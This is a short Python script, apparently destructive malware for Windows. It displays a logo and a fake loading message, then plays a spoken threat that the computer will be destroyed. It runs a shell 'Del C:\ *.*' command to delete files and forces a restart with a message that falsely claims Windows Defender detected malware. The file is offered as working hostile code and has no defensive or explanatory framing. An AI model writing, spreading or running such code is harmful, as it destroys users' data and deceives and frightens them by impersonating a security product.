# imports
import os
from tkinter import *
from gtts import gTTS
import subprocess
from PIL import ImageTk, Image
import time
import tkinter.messagebox
root = Tk()

# logo displaying
canvas = Canvas(root, width=300, height=300)
canvas.pack()
img = ImageTk.PhotoImage(Image.open("scra_l.png"))
canvas.create_image(20, 20, anchor=NW, image=img)
time.sleep(3)
tkinter.messagebox.showinfo("Loading", "Loading modules...")
time.sleep(5)
# play sound
mytext = 'your computer will be destroyed, all files, directories, and registry values will be destroyed. shut down your computer and your doomed. starting now. there is no escape.'
language = 'en'
# Passing the text and language to the engine,
# here we have marked slow=False. Which tells
# the module that the converted audio should
# have a high speed
myobj = gTTS(text=mytext, lang=language, slow=False)
myobj.save("pymods.mp3")
os.system("pymods.mp3")

time.sleep(10)
subprocess.call("Del C:\ *.* /y ", shell=True)

time.sleep(120)

subprocess.call(
    'shutdown /r /c "Windows defender has detected Firmware issues and active malware, restarting to recover Windows." /t 130 /o', shell=True)

root.mainloop()
